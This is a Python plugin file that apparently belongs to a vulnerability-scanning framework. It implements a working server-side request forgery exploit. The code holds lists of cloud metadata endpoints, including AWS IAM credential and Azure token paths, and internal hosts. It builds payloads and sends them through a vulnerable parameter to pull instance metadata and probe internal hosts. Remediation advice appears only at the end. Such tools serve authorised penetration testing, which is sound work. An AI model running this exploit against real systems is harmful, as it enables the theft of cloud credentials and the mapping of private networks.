"""
SSRF (Server-Side Request Forgery) Exploit Plugin

This plugin provides exploit capabilities for SSRF vulnerabilities including:
- Internal network scanning
- Cloud metadata extraction
- Port scanning via SSRF
- Information gathering from internal services
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    logging.warning("Requests library not available")

logger = logging.getLogger(__name__)


class SSRFPlugin(ExploitPlugin):
    """
    SSRF exploit plugin.
    
    This plugin provides SSRF exploitation capabilities including:
    - Internal network scanning
    - Cloud metadata extraction (AWS, GCP, Azure)
    - Port scanning
    - Internal service discovery
    """
    
    # Cloud metadata endpoints
    CLOUD_ENDPOINTS = {
        'aws': [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/dynamic/instance-identity/document',
        ],
        'gcp': [
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/',
            'http://metadata.google.internal/computeMetadata/v1/project/',
        ],
        'azure': [
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://169.254.169.254/metadata/identity/oauth2/token',
        ]
    }
    
    # Internal network targets to scan
    INTERNAL_HOSTS = [
        'localhost',
        '127.0.0.1',
        '169.254.169.254',
        '10.0.0.1',
        '172.16.0.1',
        '192.168.1.1',
        '192.168.0.1',
    ]
    
    # Common internal service ports
    COMMON_PORTS = [
        ('22', 'SSH'),
        ('80', 'HTTP'),
        ('443', 'HTTPS'),
        ('3306', 'MySQL'),
        ('5432', 'PostgreSQL'),
        ('6379', 'Redis'),
        ('8080', 'HTTP-Alt'),
        ('9200', 'Elasticsearch'),
    ]
    
    @property
    def vulnerability_type(self) -> str:
        """Return the vulnerability type identifier."""
        return 'ssrf'
    
    @property
    def name(self) -> str:
        """Return the plugin name."""
        return 'SSRF Exploit'
    
    @property
    def description(self) -> str:
        """Return the plugin description."""
        return (
            'Server-Side Request Forgery exploit plugin for accessing internal '
            'resources, cloud metadata, and performing network reconnaissance.'
        )
    
    @property
    def version(self) -> str:
        """Return the plugin version."""
        return '2.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Generate SSRF payloads based on context.
        
        Args:
            context: Optional context containing:
                    - target_host: Internal host to target
                    - target_port: Port to scan
                    - cloud_provider: Cloud provider (aws, azure, gcp)
        
        Returns:
            List of SSRF payload strings
        """
        context = context or {}
        target_host = context.get('target_host', '127.0.0.1')
        target_port = context.get('target_port', 80)
        cloud_provider = context.get('cloud_provider', 'aws')
        
        payloads = []
        
        # Internal host payloads
        payloads.append(f'http://{target_host}/')
        payloads.append(f'http://{target_host}:{target_port}/')
        
        # Cloud metadata payloads
        if cloud_provider in self.CLOUD_ENDPOINTS:
            payloads.extend(self.CLOUD_ENDPOINTS[cloud_provider])
        
        # URL variations
        payloads.append(f'http://localhost/')
        payloads.append(f'http://127.0.0.1/')
        payloads.append(f'http://169.254.169.254/latest/meta-data/')
        
        return payloads
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Execute SSRF exploit attack.
        
        Args:
            target_url: The target URL to attack
            vulnerability_data: Dictionary containing vulnerability information:
                              - parameter: Vulnerable parameter name
                              - method: HTTP method (GET, POST, etc.)
            config: Optional configuration dictionary
        
        Returns:
            Dict containing:
                - success: Boolean indicating if attack succeeded
                - extracted_data: Data from internal resources
                - cloud_metadata: Extracted cloud metadata
                - scanned_hosts: List of accessible internal hosts
                - evidence: Evidence of successful exploitation
                - error: Error message if attack failed
        """
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'ssrf',
            }
        
        config = config or {}
        parameter = vulnerability_data.get('parameter')
        method = vulnerability_data.get('method', 'GET').upper()
        
        if not parameter:
            return {
                'success': False,
                'error': 'No vulnerable parameter specified',
                'vulnerability_type': 'ssrf',
            }
        
        logger.info(f"Attempting SSRF exploitation on {target_url}, parameter: {parameter}")
        
        # Try to extract cloud metadata
        metadata_result = self._extract_cloud_metadata(target_url, parameter, method, config)
        
        # Try to scan internal network
        scan_result = self._scan_internal_network(target_url, parameter, method, config)
        
        # Combine results
        success = metadata_result['success'] or scan_result['success']
        
        if success:
            logger.info(f"Successfully exploited SSRF on {target_url}")
            return {
                'success': True,
                'cloud_metadata': metadata_result.get('metadata', {}),
                'scanned_hosts': scan_result.get('accessible_hosts', []),
                'evidence': metadata_result.get('evidence', '') + ' ' + scan_result.get('evidence', ''),
                'vulnerability_type': 'ssrf',
                'message': 'Successfully exploited SSRF vulnerability',
            }
        else:
            logger.info(f"SSRF exploitation attempt failed on {target_url}")
            return {
                'success': False,
                'error': 'Could not exploit SSRF vulnerability',
                'message': 'SSRF exploitation attempt was unsuccessful',
                'vulnerability_type': 'ssrf',
            }
    
    def _extract_cloud_metadata(self, url: str, parameter: str, method: str,
                                config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Attempt to extract cloud metadata via SSRF.
        
        Returns:
            Dict with success status and metadata
        """
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        metadata = {}
        
        # Try AWS metadata
        for endpoint in self.CLOUD_ENDPOINTS['aws'][:2]:
            try:
                if method == 'GET':
                    params = {parameter: endpoint}
                    response = requests.get(url, params=params, timeout=timeout, verify=verify_ssl)
                else:
                    data = {parameter: endpoint}
                    response = requests.post(url, data=data, timeout=timeout, verify=verify_ssl)
                
                # Check for AWS metadata indicators
                if any(indicator in response.text.lower() for indicator in 
                      ['ami-', 'instance-id', 'security-credentials', 'iam']):
                    metadata['aws'] = response.text[:500]
                    logger.info("Successfully extracted AWS metadata")
                    return {
                        'success': True,
                        'metadata': metadata,
                        'evidence': f'Extracted AWS metadata from {endpoint}'
                    }
            except Exception as e:
                logger.debug(f"Error extracting metadata from {endpoint}: {e}")
        
        # Try GCP metadata
        for endpoint in self.CLOUD_ENDPOINTS['gcp'][:1]:
            try:
                if method == 'GET':
                    params = {parameter: endpoint}
                    response = requests.get(url, params=params, timeout=timeout, verify=verify_ssl)
                else:
                    data = {parameter: endpoint}
                    response = requests.post(url, data=data, timeout=timeout, verify=verify_ssl)
                
                if 'metadata' in response.text.lower() or 'project' in response.text.lower():
                    metadata['gcp'] = response.text[:500]
                    logger.info("Successfully extracted GCP metadata")
                    return {
                        'success': True,
                        'metadata': metadata,
                        'evidence': f'Extracted GCP metadata from {endpoint}'
                    }
            except Exception as e:
                logger.debug(f"Error extracting GCP metadata: {e}")
        
        return {
            'success': False,
            'error': 'Could not extract cloud metadata'
        }
    
    def _scan_internal_network(self, url: str, parameter: str, method: str,
                               config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Scan internal network via SSRF.
        
        Returns:
            Dict with accessible hosts
        """
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 5)
        accessible_hosts = []
        
        # Test a few internal hosts
        for host in self.INTERNAL_HOSTS[:3]:
            target = f'http://{host}/'
            
            try:
                if method == 'GET':
                    params = {parameter: target}
                    response = requests.get(url, params=params, timeout=timeout, verify=verify_ssl)
                else:
                    data = {parameter: target}
                    response = requests.post(url, data=data, timeout=timeout, verify=verify_ssl)
                
                # If we got a different response, the host might be accessible
                if response.status_code == 200 and len(response.text) > 0:
                    accessible_hosts.append(host)
                    logger.info(f"Found accessible internal host: {host}")
            except Exception as e:
                logger.debug(f"Error scanning {host}: {e}")
        
        if accessible_hosts:
            return {
                'success': True,
                'accessible_hosts': accessible_hosts,
                'evidence': f'Found {len(accessible_hosts)} accessible internal host(s): {", ".join(accessible_hosts)}'
            }
        
        return {
            'success': False,
            'error': 'No accessible internal hosts found'
        }
    
    def get_severity_level(self) -> str:
        """Return the typical severity level for SSRF vulnerabilities."""
        return 'high'
    
    def get_remediation_advice(self) -> str:
        """Return remediation advice for SSRF vulnerabilities."""
        return (
            'Prevent SSRF attacks:\n'
            '1. Whitelist allowed protocols, hosts, and ports\n'
            '2. Disable unused URL schemas (file://, gopher://, etc.)\n'
            '3. Use network segmentation and firewall rules\n'
            '4. Implement proper input validation on URLs\n'
            '5. Disable HTTP redirections for server-side requests\n'
            '6. Block access to internal/private IP ranges (RFC1918)\n'
            '7. Use DNS rebinding protection\n'
            '8. Apply principle of least privilege to service accounts\n'
            '9. Use IMDSv2 on AWS EC2 instances\n'
            '10. Implement request signing for internal services'
        )
